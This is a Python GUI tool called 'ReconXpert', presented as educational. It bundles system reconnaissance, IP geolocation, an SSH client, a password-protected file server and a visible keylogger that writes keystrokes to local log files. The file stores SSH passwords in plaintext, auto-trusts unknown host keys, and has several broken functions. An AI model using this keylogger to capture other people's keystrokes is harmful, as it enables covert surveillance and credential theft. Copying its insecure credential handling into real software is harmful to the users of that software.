import os
import base64
import threading
from PyQt6.QtWidgets import QApplication, QMainWindow, QTextEdit, QWidget, QVBoxLayout, QHBoxLayout, QPushButton, QLineEdit, QCheckBox, QLabel, QTabWidget, QFileDialog, QMessageBox
from PyQt6.QtGui import QTextCursor, QTextCharFormat
from PyQt6.QtCore import Qt, QThread, pyqtSignal
from PyQt6.QtWidgets import QApplication, QMainWindow, QTextEdit, QWidget, QVBoxLayout, QHBoxLayout, QPushButton, QLineEdit, QCheckBox, QLabel, QTabWidget, QFileDialog, QMessageBox, QInputDialog
import sys
from http.server import SimpleHTTPRequestHandler, HTTPServer
import socket
import logging
import platform
import psutil
import subprocess
import folium
import requests
import paramiko
import time
from fpdf import FPDF
from pynput import keyboard
import queue
import asyncio
import asyncssh
import re



# Define global variables
keylogger_running = False
keystroke_buffer = ""
listener = None

def ping(domain):
    result = subprocess.run(['ping', '-c', '4', domain] if os.name != 'nt' else ['ping', domain], capture_output=True, text=True)
    with open('Ping.txt', 'a') as log_file:
        log_file.write(result.stdout)
    return result.stdout



class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()

        self.setWindowTitle(".::ReconXpert::.")
        self.setGeometry(100, 100, 800, 600)
        self.setFixedSize(800, 600) # Fixed window size

        self.central_widget = QWidget()
        self.setCentralWidget(self.central_widget)
        self.layout = QVBoxLayout(self.central_widget)

        self.tabs = QTabWidget()
        self.layout.addWidget(self.tabs)

        self.system_recon_tab = QWidget()
        self.ssh_platform_tab = QWidget()
        self.keylogger_tab = QWidget()
        self.server_config_tab = QWidget()
        self.disclaimer_license_tab = QWidget()

        self.tabs.addTab(self.system_recon_tab, "System Recon")
        self.tabs.addTab(self.ssh_platform_tab, "SSH Platform")
        self.tabs.addTab(self.keylogger_tab, "Keylogger")
        self.tabs.addTab(self.server_config_tab, "Server Config")
        self.tabs.addTab(self.disclaimer_license_tab, "Disclaimer & License")

        self.init_system_recon_tab()
        self.init_ssh_platform_tab()
        self.init_keylogger_tab()
        self.init_server_config_tab()
        self.init_disclaimer_license_tab()

    def init_system_recon_tab(self):
        layout = QVBoxLayout()
        self.log_box = QTextEdit()
        self.log_box.setReadOnly(True)
        layout.addWidget(self.log_box)

        button_layout = QHBoxLayout()
        self.get_info_button = QPushButton("Get System Info")
        self.get_info_button.clicked.connect(self.update_log_box)
        self.export_logs_button = QPushButton("Export Logs")
        self.export_logs_button.clicked.connect(self.save_main_log_box_content)
        self.ping_button = QPushButton("Ping IP/Domain")
        self.ping_button.clicked.connect(self.update_ping)
        self.geolocate_button = QPushButton("Geolocate IP Address")
        self.geolocate_button.clicked.connect(self.ip_tracer)

        button_layout.addWidget(self.get_info_button)
        button_layout.addWidget(self.export_logs_button)
        button_layout.addWidget(self.ping_button)
        button_layout.addWidget(self.geolocate_button)

        layout.addLayout(button_layout)
        self.system_recon_tab.setLayout(layout)

    def init_ssh_platform_tab(self):
        layout = QVBoxLayout()
        self.ssh_terminal = QTextEdit()
        self.ssh_terminal.setReadOnly(True)
        layout.addWidget(self.ssh_terminal)

        input_frame = QHBoxLayout()
        self.ip_entry = QLineEdit()
        self.username_entry = QLineEdit()
        self.password_entry = QLineEdit()
        self.password_entry.setEchoMode(QLineEdit.EchoMode.Password)
        self.remember_var = QCheckBox("Remember Me")

        input_frame.addWidget(QLabel("IP:"))
        input_frame.addWidget(self.ip_entry)
        input_frame.addWidget(QLabel("Username:"))
        input_frame.addWidget(self.username_entry)
        input_frame.addWidget(QLabel("Password:"))
        input_frame.addWidget(self.password_entry)
        input_frame.addWidget(self.remember_var)

        self.connect_button = QPushButton("Connect")
        self.connect_button.clicked.connect(self.ssh_connect)

        input_frame.addWidget(self.connect_button)
        layout.addLayout(input_frame)

        self.input_entry = QLineEdit()
        self.input_entry.returnPressed.connect(self.send_command)
        layout.addWidget(self.input_entry)

        self.ssh_platform_tab.setLayout(layout)

    def init_keylogger_tab(self):
        layout = QVBoxLayout()

        self.keylogger_log_box = QTextEdit()
        self.keylogger_log_box.setReadOnly(True)
        layout.addWidget(self.keylogger_log_box)

        button_layout = QHBoxLayout()
        self.keylogger_start_button = QPushButton("Start Keylogger")
        self.keylogger_start_button.clicked.connect(self.start_keylogger)
        self.keylogger_stop_button = QPushButton("Stop Keylogger")
        self.keylogger_stop_button.clicked.connect(self.stop_keylogger)
        self.save_logs_button = QPushButton("Save Logs")
        self.save_logs_button.clicked.connect(self.save_logs)

        button_layout.addWidget(self.keylogger_start_button)
        button_layout.addWidget(self.keylogger_stop_button)
        button_layout.addWidget(self.save_logs_button)

        layout.addLayout(button_layout)
        self.keylogger_tab.setLayout(layout)

    def init_server_config_tab(self):
        layout = QVBoxLayout()
        self.file_server_app = FileServerApp(self)
        layout.addWidget(self.file_server_app)
        self.server_config_tab.setLayout(layout)

    def init_disclaimer_license_tab(self):
        layout = QVBoxLayout()
        info_text = QTextEdit()
        info_text.setReadOnly(True)
        info_content = r"""
System Information, File Sharing Server and SSH Platform [100% Python]
=========================================

Developed by: Amir Faramarzpour
Year: 2024-2025

Disclaimer: For Educational Purposes Only
This software, ReconXpert, is intended solely for educational purposes. The developers do not assume any liability or responsibility for any misuse or consequences arising from the use of this software. The software should not be used for any illegal activities. Users are encouraged to use this software responsibly and in accordance with applicable laws and regulations.


1. **Introduction**:
        Useful Information:
        - This tool provides system information, keylogging, SSH, and file sharing capabilities.
        - Ensure you have appropriate permissions to use these features.
        - Keep your software up to date for security and performance improvements.
        - Always use secure passwords and encryption for SSH connections.

2. **Installation Guide**:
       - System requirements: Windows 10 and Higher - All Linux Distributions
       - This application is Portable and no further installation needed. 

3. **Data Collection**:
       - This Application Does collect sensitive data like system information and keystrokes.
       - This program does NOT share data. 
       - All logs.txt remains in local storage in the same app directory.

4. **Support and Contact Information**:
       - Need help or report issues?
       - feedback and inquiries?
       - Contact : https://t.me/amir_faramarzpour

5. **Credits**:
        - Python Software Foundation: Python language and standard libraries
        - Tkinter: GUI development
        - Pynput: Keylogger functionality
        - Paramiko: SSH functionality
        - Requests: HTTP requests and IP tracing
        - Folium: Map generation
        - Psutil: System and process utilities
        - TTkthemes: Themed Tkinter widgets

  

5. **MIT License**:

Copyright (c) [2024] [Amir Faramarzpour]
Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "ReconXpert"),to deal in the ReconXpert without restriction,including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the ReconXpert, and to permit persons to whom the ReconXpert is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial portions of the ReconXpert. THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE RECONXPERT OR THE USE OR OTHER DEALINGS IN THE RECONXPERT.
        """
        info_text.setText(info_content)
        layout.addWidget(info_text)
        self.disclaimer_license_tab.setLayout(layout)

    def update_log_box(self):
        self.log_box.clear()
        system_info = self.get_system_info() + self.get_memory_info() + self.get_cpu_info() + self.get_disk_info() + self.get_open_ports() + self.get_network_interfaces() + self.get_open_connections() + self.get_running_processes()
        self.log_box.setPlainText(system_info)

    def save_main_log_box_content(self):
        content = self.log_box.toPlainText()
        with open('Recon.txt', 'w') as log_file:
            log_file.write(content)
        QMessageBox.information(self, "Export Logs", "Logs exported to Recon.txt")

    def update_ping(self):
        domain_or_ip, ok = QInputDialog.getText(self, "Ping", "Enter IP or domain:")
        if ok:
            result = subprocess.run(['ping', domain_or_ip], capture_output=True, text=True)
            self.log_box.append(f"\nPinging {domain_or_ip}\n====================================================\n{result.stdout}")



    def ip_tracer(self):
        ip_address, ok = QInputDialog.getText(self, "IP Tracer", "Enter IP address:")
        if not ok or not ip_address:
            return
        
        def get_location(ip_address):
            try:
                response = requests.get(f"https://ipinfo.io/{ip_address}/json")
                response.raise_for_status()
                data = response.json()
                loc = data.get("loc", None)
                if loc:
                    lat, long = map(float, loc.split(","))
                else:
                    lat, long = None, None
                city = data.get("city", "Unknown")
                state = data.get("region", "Unknown")
                country = data.get("country", "Unknown")
                org = data.get("org", "Unknown")
                return lat, long, city, state, country, org
            except requests.exceptions.RequestException as e:
                self.log_box.append(f"Error fetching location for {ip_address}: {e}\n")
                return None

        location = get_location(ip_address)

        if location:
            lat, long, city, state, country, org = location
            self.log_box.append(f"\nIP Traceroute for {ip_address}\n====================================================\n")
            self.log_box.append(f"IP address is located in {city}, {state}, {country}\n")
            self.log_box.append(f"Latitude: {lat}, Longitude: {long}\n")
            self.log_box.append(f"Organization: {org}\n")
            # Create a map centered around the location
            m = folium.Map(location=[lat, long], zoom_start=10)
            folium.Marker([lat, long], popup=f"{city}, {state}, {country}").add_to(m)
            m.save("location_map.html")
            self.log_box.append("Map saved as location_map.html\n")
        else:
            self.log_box.append("Unable to fetch location.\n")




    def start_keylogger(self):
        global keylogger_thread, keylogger_running, keystroke_buffer, listener
        if keylogger_running:
            return
        keylogger_running = True

        def on_press(key):
            global keystroke_buffer
            try:
                key_str = key.char
            except AttributeError:
                key_str = str(key)

            cursor = self.keylogger_log_box.textCursor()
            format = QTextCharFormat()

            if not key_str.isalnum():
                # Insert the special character with the format
                format.setForeground(Qt.GlobalColor.red)
                cursor.insertText(key_str, format)
            else:
                # Insert the normal character without any format
                format.setForeground(Qt.GlobalColor.white)
                cursor.insertText(key_str, format)

            keystroke_buffer += key_str
            self.keylogger_log_box.setTextCursor(cursor)
            self.keylogger_log_box.ensureCursorVisible()

            with open('log.txt', 'a') as log_file:
                log_file.write(key_str)

        def main():
            global listener
            try:
                listener = keyboard.Listener(on_press=on_press)
                listener.start()
                listener.join()
            except Exception as e:
                self.keylogger_log_box.append(f"\nException in keylogger: {e}\n")
                self.keylogger_log_box.ensureCursorVisible()

        keylogger_thread = threading.Thread(target=main)
        keylogger_thread.start()



    def stop_keylogger(self):
        global keylogger_running, listener
        keylogger_running = False
        if listener:
            listener.stop()
            listener = None

    def save_logs(self):
        global keystroke_buffer
        with open('Keylogs.txt', 'w') as log_file:
            log_file.write(keystroke_buffer)

    def ssh_connect(self):
        ip = self.ip_entry.text()
        username = self.username_entry.text()
        password = self.password_entry.text()

        if self.remember_var.isChecked():
            with open('ssh_credentials.txt', 'w') as f:
                f.write(f'{ip}\n{username}\n{password}\n')
        else:
            if os.path.exists('ssh_credentials.txt'):
                os.remove('ssh_credentials.txt')
        
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip, username=username, password=password)

            channel = ssh.invoke_shell()
            self.ssh_terminal.append(f"\nSSH Connection to {ip}\n=================\n")
            self.ssh_terminal.append("Interactive SSH session started. Type your commands below. Type 'exit' or 'quit' to end the session.\n")

            def read_from_ssh():
                while True:
                    if channel.recv_ready():
                        output = channel.recv(4096).decode('utf-8')
                        output = remove_ansi_escape_codes(output)
                        if output.strip():
                            self.ssh_terminal.append(output)
                            self.ssh_terminal.verticalScrollBar().setValue(self.ssh_terminal.verticalScrollBar().maximum())
                    time.sleep(0.1)
                    if not channel.recv_ready() and channel.exit_status_ready():
                        break

            self.input_entry.returnPressed.connect(lambda: self.send_command(channel, ssh))

            self.reader_thread = threading.Thread(target=read_from_ssh)
            self.reader_thread.start()

        except Exception as e:
            self.ssh_terminal.append(f"\nError connecting to {ip}: {e}\n")

    def send_command(self, channel, ssh):
        command = self.input_entry.text()
        self.input_entry.clear()
        if command.lower() in ['exit', 'quit']:
            channel.close()
            ssh.close()
            self.ssh_terminal.append("SSH session closed.\n")
            return
        if command:
            channel.send(command + '\n')

    def get_system_info(self):
        system_info = f"""
        System: {platform.system()}
        Node Name: {platform.node()}
        Release: {platform.release()}
        Version: {platform.version()}
        Machine: {platform.machine()}
        Processor: {platform.processor()}
        """
        return system_info

    def get_memory_info(self):
        memory = psutil.virtual_memory()
        memory_info = f"""
        Total: {memory.total}
        Available: {memory.available}
        Used: {memory.used}
        Percentage: {memory.percent}%
        """
        return memory_info

    def get_cpu_info(self):
        cpu_info = f"""
        Physical cores: {psutil.cpu_count(logical=False)}
        Total cores: {psutil.cpu_count(logical=True)}
        Max Frequency: {psutil.cpu_freq().max}Mhz
        Min Frequency: {psutil.cpu_freq().min}Mhz
        Current Frequency: {psutil.cpu_freq().current}Mhz
        CPU Usage Per Core: {psutil.cpu_percent(percpu=True, interval=1)}
        Total CPU Usage: {psutil.cpu_percent()}%
        """
        return cpu_info

    def get_disk_info(self):
        disk_info = ""
        for partition in psutil.disk_partitions():
            try:
                partition_usage = psutil.disk_usage(partition.mountpoint)
            except PermissionError:
                continue
            disk_info += f"""
        Device: {partition.device}
        Mountpoint: {partition.mountpoint}
        File system type: {partition.fstype}
        Total Size: {partition_usage.total}
        Used: {partition_usage.used}
        Free: {partition_usage.free}
        Percentage: {partition_usage.percent}%
            """
        return disk_info

    def get_open_ports(self):
        open_ports = "\nOpen Ports\n====================================================\n"
        connections = psutil.net_connections(kind='inet')
        for conn in connections:
            if conn.status == 'LISTEN':
                open_ports += f"    Port: {conn.laddr.port}\n"
        return open_ports

    def get_network_interfaces(self):
        interfaces = "\nNetwork Interfaces\n====================================================\n"
        net_if_addrs = psutil.net_if_addrs()
        for interface, addrs in net_if_addrs.items():
            interfaces += f"\nInterface: {interface}\n"
            for addr in addrs:
                interfaces += f"  Address: {addr.address}\n"
        return interfaces

    def get_open_connections(self):
        connections = "\nOpen Connections\n====================================================\n"
        net_conns = psutil.net_connections()
        for conn in net_conns:
            if conn.status == 'ESTABLISHED':
                connections += f"  {conn.laddr.ip}:{conn.laddr.port} -> {conn.raddr.ip}:{conn.raddr.port}\n"
        return connections

    def get_running_processes(self):
        processes = "\nRunning Processes\n====================================================\n"
        for proc in psutil.process_iter(['pid', 'name', 'username', 'status']):
            processes += f"PID: {proc.info['pid']} | Name: {proc.info['name']} | User: {proc.info['username']} | Status: {proc.info['status']}\n"
        return processes

    def get_location(ip_address):
        try:
            response = requests.get(f"https://ipinfo.io/{ip_address}/json")
            response.raise_for_status()
            data = response.json()
            loc = data.get("loc", None)
            if loc:
                lat, long = map(float, loc.split(","))
            else:
                lat, long = None, None
            city = data.get("city", "Unknown")
            state = data.get("region", "Unknown")
            country = data.get("country", "Unknown")
            org = data.get("org", "Unknown")
            return lat, long, city, state, country, org
        except requests.exceptions.RequestException as e:
            return None

    def remove_ansi_escape_codes(text):
        ansi_escape = re.compile(r'\x1B[@-_][0-?]*[ -/]*[@-~]')
        return ansi_escape.sub('', text)

class AuthHTTPRequestHandler(SimpleHTTPRequestHandler):
    def do_AUTHHEAD(self):
        self.send_response(401)
        self.send_header('WWW-Authenticate', 'Basic realm="Login Required"')
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b'Unauthorized access')

    def do_GET(self):
        if self.headers.get('Authorization') is None:
            self.do_AUTHHEAD()
            self.wfile.write(b'Unauthorized access')
        else:
            auth_type, credentials = self.headers['Authorization'].split(' ', 1)
            if auth_type == 'Basic':
                username, password = base64.b64decode(credentials).decode().split(':', 1)
                if username == self.server.username and password == self.server.password:
                    os.chdir(self.server.directory)
                    self.server.connected_devices.add(self.client_address[0])
                    self.server.app.devices_signal.emit(self.server.connected_devices)
                    self.server.app.log_signal.emit(f"Request from {self.client_address[0]}")
                    return super().do_GET()
            self.do_AUTHHEAD()
            self.wfile.write(b'Unauthorized access')


class ServerWorker(QThread):
    log_signal = pyqtSignal(str)
    devices_signal = pyqtSignal(set)

    def __init__(self, directory, username, password, port):
        super().__init__()
        self.directory = directory
        self.username = username
        self.password = password
        self.port = port
        self.connected_devices = set()

    def run(self):
        handler_class = self.create_handler_class()
        self.server = HTTPServer(('', self.port), handler_class)
        self.server.directory = self.directory
        self.server.username = self.username
        self.server.password = self.password
        self.server.connected_devices = self.connected_devices
        self.server.app = self
        self.log_signal.emit(f"Serving on port {self.port}...")
        self.server.serve_forever()

    def create_handler_class(self):
        parent = self
        class CustomHandler(AuthHTTPRequestHandler):
            def log_message(self, format, *args):
                parent.log_signal.emit(format % args)

            def do_GET(self):
                if self.headers.get('Authorization') is None:
                    self.do_AUTHHEAD()
                    self.wfile.write(b'Unauthorized access')
                else:
                    auth_type, credentials = self.headers['Authorization'].split(' ', 1)
                    if auth_type == 'Basic':
                        username, password = base64.b64decode(credentials).decode().split(':', 1)
                        if username == self.server.username and password == self.server.password:
                            os.chdir(self.server.directory)
                            self.server.connected_devices.add(self.client_address[0])
                            parent.devices_signal.emit(self.server.connected_devices)
                            return super().do_GET()
                    self.do_AUTHHEAD()
                    self.wfile.write(b'Unauthorized access')
        return CustomHandler

    def stop_server(self):
        if self.server:
            self.server.shutdown()
            self.server.server_close()
            self.log_signal.emit("Server stopped.")




class FileServerApp(QWidget):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.server_thread = None
        self.server_worker = None
        self.directory = ''
        self.username = ''
        self.password = ''
        self.port = 8000
        self.local_ip = self.get_local_ip()
        self.connected_devices = set()
        self.create_widgets()

    def create_widgets(self):
        layout = QVBoxLayout()

        self.directory_label = QLabel("Directory to Share:")
        self.directory_entry = QLineEdit()
        self.browse_button = QPushButton("Browse")
        self.browse_button.clicked.connect(self.browse_directory)

        layout.addWidget(self.directory_label)
        layout.addWidget(self.directory_entry)
        layout.addWidget(self.browse_button)

        self.username_label = QLabel("Username:")
        self.username_entry = QLineEdit()
        layout.addWidget(self.username_label)
        layout.addWidget(self.username_entry)

        self.password_label = QLabel("Password:")
        self.password_entry = QLineEdit()
        self.password_entry.setEchoMode(QLineEdit.EchoMode.Password)
        layout.addWidget(self.password_label)
        layout.addWidget(self.password_entry)

        self.port_label = QLabel("Port:")
        self.port_entry = QLineEdit(str(self.port))
        layout.addWidget(self.port_label)
        layout.addWidget(self.port_entry)

        self.start_button = QPushButton("Start Server")
        self.start_button.clicked.connect(self.start_server)
        self.stop_button = QPushButton("Stop Server")
        self.stop_button.clicked.connect(self.stop_server)
        self.stop_button.setDisabled(True)

        layout.addWidget(self.start_button)
        layout.addWidget(self.stop_button)

        self.log_text = QTextEdit()
        self.log_text.setReadOnly(True)
        layout.addWidget(self.log_text)

        self.connected_devices_label = QLabel("Connected Devices:")
        self.connected_devices_text = QTextEdit()
        self.connected_devices_text.setReadOnly(True)
        layout.addWidget(self.connected_devices_label)
        layout.addWidget(self.connected_devices_text)

        self.setLayout(layout)

    def browse_directory(self):
        directory = QFileDialog.getExistingDirectory(self, "Select Directory")
        if directory:
            self.directory_entry.setText(directory)

    def log(self, message):
        self.log_text.append(message)

    def update_connected_devices(self, devices):
        self.connected_devices_text.clear()
        for device in devices:
            self.connected_devices_text.append(f"{device}\n")

    def start_server(self):
        directory = self.directory_entry.text()
        username = self.username_entry.text()
        password = self.password_entry.text()
        port = int(self.port_entry.text())
        if not directory or not username or not password or not port:
            QMessageBox.critical(self, "Error", "All fields are required!")
            return

        self.server_worker = ServerWorker(directory, username, password, port)
        self.server_worker.log_signal.connect(self.log)
        self.server_worker.devices_signal.connect(self.update_connected_devices)
        self.server_thread = QThread()
        self.server_worker.moveToThread(self.server_thread)

        self.server_thread.started.connect(self.server_worker.start)
        self.server_thread.finished.connect(self.server_worker.deleteLater)
        self.server_thread.start()

        self.stop_button.setDisabled(False)

    def stop_server(self):
        if self.server_worker:
            self.server_worker.stop_server()
            self.server_thread.quit()
            self.server_thread.wait()
            self.server_worker = None
            self.stop_button.setDisabled(True)

    def get_local_ip(self):
        try:
            hostname = socket.gethostname()
            ip = socket.gethostbyname(hostname)
        except Exception:
            ip = '127.0.0.1'
        return ip




class SSHWorker(QThread):
    output_signal = pyqtSignal(str)

    def __init__(self, channel):
        super().__init__()
        self.channel = channel

    def run(self):
        while True:
            if self.channel.recv_ready():
                output = self.channel.recv(4096).decode('utf-8')
                output = remove_ansi_escape_codes(output)
                if output.strip():
                    self.output_signal.emit(output)
            time.sleep(0.1)
            if not self.channel.recv_ready() and self.channel.exit_status_ready():
                break

def ssh_connect(self):
    ip = self.ip_entry.text()
    username = self.username_entry.text()
    password = self.password_entry.text()

    if self.remember_var.isChecked():
        with open('ssh_credentials.txt', 'w') as f:
            f.write(f'{ip}\n{username}\n{password}\n')
    else:
        if os.path.exists('ssh_credentials.txt'):
            os.remove('ssh_credentials.txt')

    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, username=username, password=password)

        channel = ssh.invoke_shell()
        self.ssh_terminal.append(f"\nSSH Connection to {ip}\n=================\n")
        self.ssh_terminal.append("Interactive SSH session started. Type your commands below. Type 'exit' or 'quit' to end the session.\n")

        self.ssh_worker = SSHWorker(channel)
        self.ssh_worker.output_signal.connect(self.update_ssh_terminal)
        self.ssh_worker.start()

    except Exception as e:
        self.ssh_terminal.append(f"\nError connecting to {ip}: {e}\n")

def send_command(self):
    command = self.input_entry.text()
    self.input_entry.clear()
    if command.lower() in ['exit', 'quit']:
        self.ssh_worker.channel.close()
        self.ssh_worker.ssh.close()
        self.ssh_terminal.append("SSH session closed.\n")
        return
    if command:
        self.ssh_worker.channel.send(command + '\n')

def update_ssh_terminal(self, output):
    self.ssh_terminal.append(output)
    self.ssh_terminal.verticalScrollBar().setValue(self.ssh_terminal.verticalScrollBar().maximum())





def main():
    app = QApplication(sys.argv)
    app.setStyle("Macintosh")  # Set   theme

    window = MainWindow()
    window.show()
    sys.exit(app.exec())

if __name__ == '__main__':
    keystroke_buffer = ""  # Define global variable for keystroke buffer
    main()
